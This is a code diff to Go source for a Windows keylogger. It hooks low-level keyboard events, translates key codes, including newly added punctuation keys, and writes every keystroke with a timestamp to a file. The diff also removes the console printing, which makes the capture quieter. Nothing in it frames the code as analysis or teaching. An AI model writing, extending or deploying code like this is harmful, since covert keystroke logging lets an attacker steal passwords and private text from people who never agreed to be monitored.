@@ -62,7 +62,7 @@ var asciiMap = map[int]string{
 	88:  "x",
 	89:  "y",
 	90:  "z",
-	13:  "\nEnter",
+	13:  " Enter ",
 	27:  " ESC ",
 	160: " LSHIFT ",
 	161: " RSHIFT ",
@@ -74,6 +74,16 @@ var asciiMap = map[int]string{
 	167: " HOME ",
 	91:  " WIN ",
 	9:   " TAB ",
+	190: ".",
+	191: "/",
+	188: ",",
+	186: ";",
+	222: "'",
+	219: "[",
+	221: "]",
+	189: "-",
+	187: "=",
+	220: "\\",
 }
 
 type HHOOK uintptr
@@ -131,12 +141,10 @@ func SetWindowsHookEx(idHook int, lpfn uintptr, hmod uintptr, dwThreadId uint32)
 	return HHOOK(ret)
 }
 
-
 func CallNextHookEx(hhk HHOOK, nCode int, wParam WPARAM, lParam LPARAM) LRESULT {
 	ret, _, _ := procCallNextHookEx.Call(uintptr(hhk), uintptr(nCode), uintptr(wParam), uintptr(lParam))
 	return LRESULT(ret)
 }
-
 
 func LowLevelKeyboardProc(nCode int, wParam WPARAM, lParam LPARAM) LRESULT {
 	if nCode == HC_ACTION {
@@ -161,9 +169,6 @@ func LowLevelKeyboardProc(nCode int, wParam WPARAM, lParam LPARAM) LRESULT {
 				output = fmt.Sprintf("Keydown: Unknown (0x%04X)", vkCode)
 			}
 
-			// Print to stdout
-			fmt.Println(output)
-
 			// Write to file
 			if file != nil {
 				if _, err := file.WriteString(fmt.Sprintf("%v : %v : %v\n", time.Now(), vkCode, output)); err != nil {
@@ -178,20 +183,17 @@ func LowLevelKeyboardProc(nCode int, wParam WPARAM, lParam LPARAM) LRESULT {
 	return CallNextHookEx(hook, nCode, wParam, lParam)
 }
 
-
 func getKeyState(vkCode int) int {
 	ret, _, _ := procGetKeyState.Call(uintptr(vkCode))
 	return int(ret)
 }
 
-
 func transform(s string, shift bool) string {
 	if len(s) != 1 {
 		return s
 	}
-	
+
 	c := s[0]
-	
 
 	if c >= 'a' && c <= 'z' {
 		if shift {
@@ -199,7 +201,6 @@ func transform(s string, shift bool) string {
 		}
 		return s
 	}
-	
 
 	if c >= 'A' && c <= 'Z' {
 		if shift {
@@ -207,7 +208,6 @@ func transform(s string, shift bool) string {
 		}
 		return string(c + ('a' - 'A'))
 	}
-	
 
 	if c >= '0' && c <= '9' {
 		if shift {
@@ -215,11 +215,10 @@ func transform(s string, shift bool) string {
 		}
 		return s
 	}
-	
-	
+
 	symbols := "`1234567890-=[]\\;',./"
 	symbolsShift := "~!@#$%^&*()_+{}|:\"<>?"
-	
+
 	for i := 0; i < len(symbols); i++ {
 		if c == symbols[i] {
 			if shift {
@@ -228,10 +227,9 @@ func transform(s string, shift bool) string {
 			return string(c)
 		}
 	}
-	
+
 	return s
 }
-
 
 func UnhookWindowsHookEx(hhk HHOOK) bool {
 	ret, _, _ := procUnhookWindowsHookEx.Call(uintptr(hhk))
